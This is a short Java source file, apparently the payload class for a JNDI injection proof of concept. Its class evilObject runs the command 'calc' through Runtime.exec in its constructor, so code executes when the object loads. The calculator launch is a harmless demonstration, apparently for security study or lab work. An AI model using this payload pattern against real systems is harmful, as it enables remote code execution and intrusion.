package com.JNDI;

import java.io.IOException;

public class evilObject {
    public evilObject() throws IOException {
        Runtime.getRuntime().exec("calc");
    }
}